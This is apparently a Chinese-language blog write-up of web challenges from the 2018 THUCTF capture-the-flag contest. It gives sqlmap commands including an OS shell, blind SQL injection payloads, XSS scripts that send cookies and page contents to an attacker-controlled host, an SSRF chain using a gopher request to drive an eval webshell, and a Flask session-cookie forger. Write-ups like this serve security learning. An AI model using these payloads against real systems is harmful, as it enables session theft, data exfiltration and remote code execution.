---
title: THUCTF 第二届 Web writeup
date: 2018-10-08 14:33
tags:
- CTF
- Web
categories: CTF
description: 清华紫荆花第二届招新赛 web 题目的解答，非常详细！
---

## THUCTF 第二届比赛 Web WRITEUP

2018 年 9 月 18 号到 2018 年 9 月 28 号在参加了 THUCTF 比赛，总结一下 Web 解题步骤和收获。

### wdSimpleSQLv1

本题是用 python 的 tornado 编写的 SQL 注入题目，有二个 challenge，登录发现文字如下：

![1538201774670](https://saferman.github.io/assets/img/thuctf2018/SQLv1v2_goal.png)

可以看到我们第一个任务是从数据库里读取 Flag，第二个任务是从文件系统读取 Flag。既然题目给了完整的 PY 源代码，我们就来审计一下哪里存在注入点：

![1538202746841](https://saferman.github.io/assets/img/thuctf2018/cowname_injection.png)

可以很容易的发现 cowid 未经过滤的放入 sql 语句里，并且随后使用 self.db.query(sql) 进行查询导致漏洞的出现。

更有意思的可以发现，查询出错，返回结果不为 1 以及提取 description 失败返回的错误信息都是不一样的！本题直接使用 sqlmap 运行跑出结果。

##### 第一步：截获请求数据包，保存为 bhttp。

![1538203026049](https://saferman.github.io/assets/img/thuctf2018/cowname_http_packet.png)

上图 cowname 是手注测试的，使用 SQLMAP 需要的数据包 cowname 参数传递为 1。

##### 第二步：使用 SQLMAP

执行命令如下：

```shell
# 探测注入点
sqlmap -r bhttp -p cowname --dbms mysql --tamper=space2comment  --risk 3 --level 3
# 恢复数据库名称、导出 flag 表的 flag 列的内容
sqlmap -r bhttp -p cowname --dbms mysql --tamper=space2comment  --risk 3 --level 3 -T flag -C flag --dump
```

当然 flag 表名和字段是根据经验第一时间就猜到了，也可以使用注入命令依次恢复数据库名、表名、列名。最终结果如下：

![1538203763301](https://saferman.github.io/assets/img/thuctf2018/sqlv1_flag.png)

### wdSimpleSQLv2

源码同上，注入点也是一样的。需要读取 @@secure_file_priv/flag。使用下述命令得到 sql-shell：

```shell
sqlmap -r bhttp -p cowname --dbms mysql --tamper=space2comment  --os-shell
```

执行 select load_file('/var/lib/mysql-files/flag'); 得到结果

![1538204367167](https://saferman.github.io/assets/img/thuctf2018/sql_load_file_flag.png)

### wdSimpleSQLv4

本题加大难度，首先下载源码审计先看看之前的 cowname 注入点是否还存在注入。

![1538222309402](https://saferman.github.io/assets/img/thuctf2018/cowname_sql4.png)

注意 cowid 这里是作为参数传入 query 的，db 是 MYSQLdb, 阅读源码知道：

```
https://github.com/PyMySQL/mysqlclient-python/blob/master/MySQLdb/cursors.py
https://github.com/PyMySQL/mysqlclient-python/blob/master/MySQLdb/connections.py 
```

![1538223536623](https://saferman.github.io/assets/img/thuctf2018/escape_string.png)

也不存在宽字节注入，因此这个点没有注入问题。继续审计代码，发现：

虽然注册的时候使用正则匹配了 username 内容，但是登录的时候这一步是在前端完成的！而 Login 处代码如下：

![1538223741805](https://saferman.github.io/assets/img/thuctf2018/username_sql4.png)

可以看到，存在基于报错和基于逻辑的 SQL 注入问题！关键问题是要绕过 blacklist，如下：

![1538223835728](https://saferman.github.io/assets/img/thuctf2018/regex_sql4.png)

分析之后可以得到如下可以使用的字符：

![1538223933000](https://saferman.github.io/assets/img/thuctf2018/allowed-char.png)

根据 MYSQL 相关的语法得到如下测试 Payload 和注入 Payload。

```
# 测试 Payload
username=qwert'and('a'='a')#&password=qwert      
```

```
# 注入 Payload，破解表名
username=qwert'and(substring((select(group_concat(table_name))from(information_schema.TABLES)where(TABLE_SCHEMA='rctf')),(ord('b')MOD(ord('a'))),(ord('b')MOD(ord('a'))))='p')#&password=qwert 
```

但是这里有一个坑！，就是大小写的问题，table 对大小写是敏感的！！！并且：

![1538224215909](https://saferman.github.io/assets/img/thuctf2018/case_equal.png)

上述注入 Payload 得到的表名大小写无法确定，我在实际做题的时候得到 pisaukbsoucg。 这个表在后面使用下面的 Payload 查询得到表不存在的错误：

```
username=qwert'and(mid((select(flag)from(pisaukbsoucg)),(ord('b')MOD(ord('a'))),(ord('b')MOD(ord('a'))))='T')#&password=qwert 
```

正确的破解表名 Payload 如下：

```
username=qwert'and(substring((select(group_concat(binary(table_name)))from(information_schema.TABLES)where(TABLE_SCHEMA='rctf')),(ord('b')MOD(ord('a'))),(ord('b')MOD(ord('a'))))='p')#&password=qwert
```

得到表名 PIsAukBsoucg 和字段名 wUpWAcapJIxP， 最终破解 flag 的 Payload 如下：

```
username=qwert'and(mid((select(binary(wUpWAcapJIxP))from(PIsAukBsoucg)),(ord('|')MOD(ord(']'))),(ord('b')MOD(ord('a'))))='§T§')#&password=qwert
```

PS：未来有个任务是编写一个自动破解并组装 Flag 的 Python 程序，最好能直接处理 Burp 保存的 HTTP header。

### XSS1 和 XSS2

XSS1 这题是考察 CSP 绕过的，我们截获返回数据包：

![1538226270011](https://saferman.github.io/assets/img/thuctf2018/CSP.png)

使用下述 Payload：

```javascript
<script>
var n0 t = document.createElement("link");n0 t.setAttribute("rel", "prefetch");
n0 t.setAttribute("href", "http://IP:81/?a="+document.cookie);document.head.appendChild(n0 t);
</script>
```

服务单使用命令：

```python
python -m SimpleHTTPServer 81
```

注意登录界面有个验证码，使用的破解代码：

```python
import random
import string
def md5(str):
    import hashlib
    m = hashlib.md5()
    m.update(str)
    return m.hexdigest()
while 1:
    string = ''
    s = string.join(random.sample('qwertyuiopasdfghjklzxcvbnm1234567890',4))
    if md5(s)[0:4] == 'f8f3':
        print s
        break
```

XSS2 的任务是 "The flag is in flag.php : ),  read it using XSS, please.”。Payload 如下：

```javascript
<script type="text/javascript">
function loadXMLDoc()
{
var xmlhttp;
if (window.XMLHttpRequest)
  {// code for IE7+, Firefox, Chrome, Opera, Safari
  xmlhttp=new XMLHttpRequest();
  }
else
  {// code for IE6, IE5
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
xmlhttp.onreadystatechange=function()
  {
  if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
        var myhttp;
        if (window.XMLHttpRequest)
         {// code for IE7+, Firefox, Chrome, Opera, Safari
           myhttp=new XMLHttpRequest();
          }
        else
         {// code for IE6, IE5
           myhttp=new ActiveXObject("Microsoft.XMLHTTP");
         }
         myhttp.open("GET", "http://IP:81/?c="+xmlhttp.responseText, true);
         myhttp.send()
    }
  }
xmlhttp.open("GET","http://65.52.174.189 sp",true);
xmlhttp.setRequestHeader("Cookie", document.cookie)
xmlhttp.send();
}
loadXMLDoc();
</script>
```

### Babyweb

这是一道 SSRF 题目。访问题目地址：[http://babyweb.thuctf2018.game.redbud.info:8016/](http://babyweb.thuctf2018.game.redbud.info:8016/)，显示出源代码：

```php
<?php
function curl($url){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    $re = curl_exec($ch);
    curl_close($ch);
    return $re;
}
if(!empty($_GET['url'])){
    $url = $_GET['url'];
    curl($url);
}else{
    highlight_file(__FILE__); 
}
```

先做目录路径爆破，得到 robots.txt 如下：

```
User-agent: *
Disallow: /webshe11111111.php
```

然后我们 http 访问这个文件，如下。得到回显：You aren't admin!

```
http://babyweb.thuctf2018.game.redbud.info:8016/?url=http://127.0.0.1/webshe11111111.php
```

利用 file 协议读取这个后门：

```
http://babyweb.thuctf2018.game.redbud.info:8016/?url=file:///var/www/html/webshe11111111.php
```

查看页面源代码如下：

```php
<?php

$serverList = array(
    "127.0.0.1"
);
$ip = $_SERVER['REMOTE_ADDR'];
foreach ($serverList as $host) {
    if ($ip === $host) {
        if ((!empty($_POST['admin'])) and $_POST['admin'] === 'h1admin') {
            @eval($_POST['hacker']);
        } else {
            die("You aren't admin!");
        }
    } else {
        die('This is webshell');
    }
}
```

可见我们需要一个 HTTP POST 操作来操作这个后门，想到使用 **gopher 协议 **。这里使用一个别人的脚本生成 gopher 需要的字符串：

```Python
exp='''\
POST /webshe11111111.php HTTP/1.1
Host:127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://localhost:63342/php/webshe11111111.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Cookie: Phpstorm-c2b818=be05b847-c935-441b-bdb7-465508c336b0
Connection: close
Upgrade-Insecure-Requests: 1

admin=h1admin&hacker=system('ls');
'''
import urllib
tmp = urllib.quote(exp)
new = tmp.replace("%0A","%0D%0A")
result = "_"+urllib.quote(new)
print result
```

运行得到结果：

```
_POST%2520/webshe11111111.php%2520HTTP/1.1%250D%250AHost%253A127.0.0.1%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253 B%2520Win64%253 B%2520x64%253 B%2520rv%253A61.0%2529%2520Gecko/20100101%2520Firefox/61.0%250D%250AAccept%253A%2520 text/html%252Capplication/xhtml%252 Bxml%252Capplication/xml%253 Bq%253D0.9%252C%252A/%252A%253 Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253 Bq%253D0.8%252Czh-TW%253 Bq%253D0.7%252Czh-HK%253 Bq%253D0.5%252Cen-US%253 Bq%253D0.3%252Cen%253 Bq%253D0.2%250D%250AAccept-Encoding%253A%2520 gzip%252C%2520deflate%250D%250AReferer%253A%2520 http%253A//localhost%253A63342/php/webshe11111111.php%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252034%250D%250ACookie%253A%2520Phpstorm-c2b818%253Dbe05b847-c935-441b-bdb7-465508c336b0%250D%250AConnection%253A%2520close%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250A%250D%250Aadmin%253Dh1admin%2526 hacker%253Dsystem%2528%2527ls%2527%2529%253 B%250D%250A
```

最终访问

```
http://babyweb.thuctf2018.game.redbud.info:8016/?url=gopher://127.0.0.1:80/_POST%2520/webshe11111111.php%2520HTTP/1.1%250D%250AHost%253A127.0.0.1%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253 B%2520Win64%253 B%2520x64%253 B%2520rv%253A61.0%2529%2520Gecko/20100101%2520Firefox/61.0%250D%250AAccept%253A%2520 text/html%252Capplication/xhtml%252 Bxml%252Capplication/xml%253 Bq%253D0.9%252C%252A/%252A%253 Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253 Bq%253D0.8%252Czh-TW%253 Bq%253D0.7%252Czh-HK%253 Bq%253D0.5%252Cen-US%253 Bq%253D0.3%252Cen%253 Bq%253D0.2%250D%250AAccept-Encoding%253A%2520 gzip%252C%2520deflate%250D%250AReferer%253A%2520 http%253A//localhost%253A63342/php/webshe11111111.php%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252034%250D%250ACookie%253A%2520Phpstorm-c2b818%253Dbe05b847-c935-441b-bdb7-465508c336b0%250D%250AConnection%253A%2520close%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250A%250D%250Aadmin%253Dh1admin%2526 hacker%253Dsystem%2528%2527ls%2527%2529%253 B%250D%250A
```

成功执行 ls 命令！发现目录下有一个 fl11111aaaaaggggg.php 文件，使用 file 协议读取得到：

```
Flag{Th1 s_Easy_SSRF}
```

当然本题还有一个可能存在问题的点，我也测试了，就是使用 SSRF 扫描内网端口，发现 3389 MYSQL 的服务，有可能存在 gopher 安全问题，这里记录一下。

### Flask

这道题是**模板注入**结合 **Flask session** 安全的题目。模板注入的利用格式如下：

```
http://flask.thuctf2018.game.redbud.info:8000/welcome?msg={{payload}}
```

测试后端过滤的内容，发现如下内容被过滤了：

```
config
(
)
```

那我们测试一些网上常用的 payload 来搜集信息：

```

```

起初我是想利用模板注入得到 shell，但是调研了一下在不使用 ( ) 条件下挺难的，有没有发现其他用户添加的函数。后来仔细考虑题目主页有句话：

![1538232368415](https://saferman.github.io/assets/img/thuctf2018/index_flask.png)

然后调研了一下会不会与 session 有关，发现果然是的，而且虽然前面的模板注入无法 GetShell，但是通过比对得到信息和本地最基本的 Flask 模板注入得到的信息差异发现有个 secret_key 参数！

然后我们看看下面代码，就是一个典型的利用 session 验证的 Flask 程序：

```python
#encoding:utf-8
from flask import Flask, session, escape, request

app = Flask(__name__)
app.secret_key = '!955)aa1~2.7e2ad'

@app.route("/")
def index():
    session['username'] = 'admin'
    return 'hello, {}\n'.format(escape(session['username']))

# 下面是二个示例 session，格式：信息 . 时间戳 . 签名
# eyJ1c2VybmFtZSI6eyIgYiI6IllXUnRhVzQ9In19.DoapPw.A3ncoLOkI0bwCXPE6f5GdDNVi3M
# eyJ1c2VybmFtZSI6eyIgYiI6IllXUnRhVzQ9In19.DoaquA.a5UttuPGlFJ8 tUGdLrXiY28T4TI
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
```

在 Flask session 安全中，最危险的就是 secret_key 泄露，这个可以导致签名任意信息伪造！更多的技术细节可以 google 学习。

所以本题我们的目标就是利用 泄露的 secret_key 伪造成 admin 身份，我们先对信息部分 base64 解密，注意如果开头有个 . 说明惊醒了 zlib.compress 需要使用 decompress 处理。最后我们使用下面 forge_flask_session.py 伪造身份！（注意信息的原文是 utf-8 还是 unicode 编码对 之后编码、加密过的 session 有影响，本体是需要 unicode 字符信息）

```python
#!/usr/bin/env python3
# encoding: utf-8

from hashlib import sha1
from flask.sessions import session_json_serializer
from itsdangerous import URLSafeTimedSerializer, BadTimeSignature
import base64
import zlib
from cuteprint.cuteprint import PrettyPrinter

PAYLOAD = {u'username': u'admin'}

p = PrettyPrinter()

signer = URLSafeTimedSerializer(
    '!955)aa1~2.7e2ad', salt='cookie-session',
    serializer=session_json_serializer,
    signer_kwargs={'key_derivation': 'hmac', 'digest_method': sha1}
)

def forgeSession():
    gen_payload = signer.dumps(PAYLOAD)
    p.print_good("Generated signed cookie : {}".format(gen_payload))

if __name__ == '__main__':

    p.print_title("Flask Cookie Forger")

    # Forge
    p.print_separator(suffix="FORGING COOKIE", separator='=')
    t2 = p.start_progress(task="Forge Cookie with payload {} ...".format(PAYLOAD), enable_dots=False)
    forgeSession()
    p.stop_progress(t2)
```

更多的相关脚本如下：

verify_flask_session.py

```python
#!/usr/bin/env python3
# encoding: utf-8

from hashlib import sha512
from flask.sessions import session_json_serializer
from itsdangerous import URLSafeTimedSerializer, BadTimeSignature
import base64
import zlib
from cuteprint import PrettyPrinter # Available here : https://github.com/terryvogelsang/cuteprint

EXAMPLE_SESSION = '.eJwlj0FuwzAMBP-icw4iJdFiPmNQ5 BINArSAnZyK_j0Get_BzP6WPQ-cX-X-Ot64lf0R5V5 s1 sEBClFMY-qWvACMJFelBKp6o1 hWVRJC050Cm4oNSCNp2aXpUIfVMbeexKjcPRKrL2dJulYDxDW56aVL1RgZQtUqlVvx88j99fPE99UTGTxyTYQsUV5kdeNltnX22cJ1CNs2-eLeJ47_E9LL3wdmwz_i.DbwCXg.HQ1RqyWO8SVCgiL5zC-weeD3AjkdGVWTpXSl_PUyC4nnK7kvKrzX6uv1pwxWzx6VaukHjzb5Dkf8vTo3yNmHEA'

p = PrettyPrinter()

signer = URLSafeTimedSerializer(
    'secret-key', salt='cookie-session',
    serializer=session_json_serializer,
    signer_kwargs={'key_derivation': 'hmac', 'digest_method': sha512}
)

def readAndVerifyCookie():
    try:
        session_data = signer.loads(EXAMPLE_SESSION)
        p.print_good("Correct Signature !")
        p.print_good("Session Data : {}".format(session_data))
    except BadTimeSignature:
        p.print_bad("Incorrect Signature for cookie : {}".format(EXAMPLE_SESSION))

if __name__ == '__main__':

    p.print_title("Flask Cookie Checker")

    # Decode
    p.print_separator(suffix="DECODING COOKIE", separator='=')
    t1 = p.start_progress(task="Decoding Cookie {} ...".format(EXAMPLE_SESSION), enable_dots=False)
    readAndVerifyCookie()
    p.stop_progress(t1)
```

decode_flask_session.py

```python
#!/usr/bin/env python3
# encoding: utf-8

from hashlib import sha512
from flask.sessions import session_json_serializer
from itsdangerous import URLSafeTimedSerializer, BadTimeSignature
import base64
import zlib
from cuteprint import PrettyPrinter

EXAMPLE_SESSION = '.eJwlj0FuwzAMBP-icw4iJdFiPmNQ5 BINArSAnZyK_j0Get_BzP6WPQ-cX-X-Ot64lf0R5V5 s1 sEBClFMY-qWvACMJFelBKp6o1 hWVRJC050Cm4oNSCNp2aXpUIfVMbeexKjcPRKrL2dJulYDxDW56aVL1RgZQtUqlVvx88j99fPE99UTGTxyTYQsUV5kdeNltnX22cJ1CNs2-eLeJ47_E9LL3wdmwz_i.DbwCXg.HQ1RqyWO8SVCgiL5zC-weeD3AjkdGVWTpXSl_PUyC4nnK7kvKrzX6uv1pwxWzx6VaukHjzb5Dkf8vTo3yNmHEA'

p = PrettyPrinter()

def decodeCookiePayload():
    
    if EXAMPLE_SESSION[0] == '.':
        session_payload = EXAMPLE_SESSION[1:].split('.')[0]
        p.print_good("Extracted Session datas : {}".format(session_payload))
        decoded_session_payload = base64.urlsafe_b64decode(session_payload)
        decompressed_session_payload = zlib.decompress(decoded_session_payload)
        p.print_good("Extracted decoded uncompressed datas : {} ".format(decompressed_session_payload))
        
if __name__ == '__main__':

    p.print_title("Flask Cookie Session Datas Decoder")

    # Decode
    p.print_separator(suffix="DECODING COOKIE PAYLOAD", separator='=')
    t1 = p.start_progress(task="Decoding Cookie Payload from {} ...".format(EXAMPLE_SESSION), enable_dots=False)
    decodeCookiePayload()
    p.stop_progress(t1)
```